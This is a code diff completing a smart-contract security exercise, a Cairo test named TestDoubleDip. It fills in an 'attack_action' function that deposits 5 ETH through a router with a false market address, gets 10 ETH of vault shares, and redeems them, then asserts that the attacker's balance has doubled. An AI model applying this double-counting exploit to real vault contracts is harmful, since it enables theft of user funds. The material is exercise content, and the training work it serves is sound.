@@ -39,10 +39,15 @@ mod TestDoubleDip {
         stop_prank(CheatTarget::One(eth_vault_address));
 
         attack_action(router_address, wETH_address, eth_vault_address);
-        'Excerise Completed!'.print();
+        let attacker_final_balance: u256 = IERC20CamelSafeDispatcher {
+            contract_address: wETH_address
+        }
+            .balanceOf(Constants::attacker())
+            .unwrap();
+        assert(attacker_final_balance == 10000000000000000000, 'Exercise::Error');
+        'Excercise Completed!'.print();
     }
 
-    // Complete the below function 
     #[feature("safe_dispatcher")]
     fn attack_action(router: ContractAddress, wETH: ContractAddress, eth_vault: ContractAddress) {
         let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
@@ -70,12 +75,23 @@ mod TestDoubleDip {
         let _deposit_id: u8 = Router
             .deposit_request(market_id, false_market_address, deposit_amount)
             .unwrap();
-            
         stop_prank(CheatTarget::One(router));
+
         start_prank(CheatTarget::One(eth_vault), attacker);
         let sdETH_balance: u256 = Vault.share_balance(attacker).unwrap();
         stop_prank(CheatTarget::One(eth_vault));
         assert(sdETH_balance == 10000000000000000000, 'Invalid Shares');
+
+        // Redeem 
+        start_prank(CheatTarget::One(eth_vault), attacker);
+        Vault.approve_share(eth_vault, sdETH_balance).unwrap();
+        stop_prank(CheatTarget::One(eth_vault));
+
+        start_prank(CheatTarget::One(router), attacker);
+        let _redeem_id: u8 = Router
+            .redeem_request(market_id, false_market_address, sdETH_balance)
+            .unwrap();
+        stop_prank(CheatTarget::One(router));
     }
 }
 
